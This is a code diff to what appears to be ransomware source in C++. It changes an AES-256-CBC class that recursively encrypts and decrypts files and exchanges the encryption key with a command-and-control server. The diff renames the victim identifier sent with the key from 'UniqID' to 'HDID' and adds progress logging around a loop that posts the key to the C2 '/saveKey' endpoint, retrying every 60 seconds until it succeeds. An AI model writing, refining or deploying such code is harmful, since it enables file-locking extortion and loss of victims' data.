@@ -140,6 +140,7 @@ void AES256CBC::decryptRecursively(const std::filesystem::path& path) {
         if (filename.extension() == extension_ and std::filesystem::is_regular_file(entry))
             decryptFile(filename);
     }
+
 }
 
 bool AES256CBC::encryptFile(const std::filesystem::path& pathIn) {
@@ -209,7 +210,7 @@ void AES256CBC::generateKey() {
 
 void AES256CBC::keyFromC2(const std::string& id) {
     auto getKey = [&]() {
-        return cpr::Get(C2Addr + "/ReturnToSender",cpr::Body{"UniqID="+id});
+        return cpr::Get(C2Addr + "/ReturnToSender",cpr::Body{"HDID="+id});
     };
 
     cpr::Response r;
@@ -250,12 +251,16 @@ void AES256CBC::keyToC2(const std::string& id) {
     std::string encodedKey = base64EncodeKey();
     auto postKey = [&]() {
         return cpr::Post(C2Addr + "/saveKey",
-                         cpr::Body{"Key=" + encodedKey + "&UniqID=" + id}
+                         cpr::Body{"Key=" + encodedKey + "&HDID=" + id}
                         );
     };
     using namespace std::chrono_literals;
-    while ( postKey().status_code != 200 )
+    cout() << WORK << "Sending key to C2...\n";
+    while ( postKey().status_code != 200 ) {
+        cout() << INDENT << " Working...\n";
         std::this_thread::sleep_for(60s);
+    }
+    cout() << INDENT << OK << "Done.\n";
 }
 
 void AES256CBC::keyToFile() {
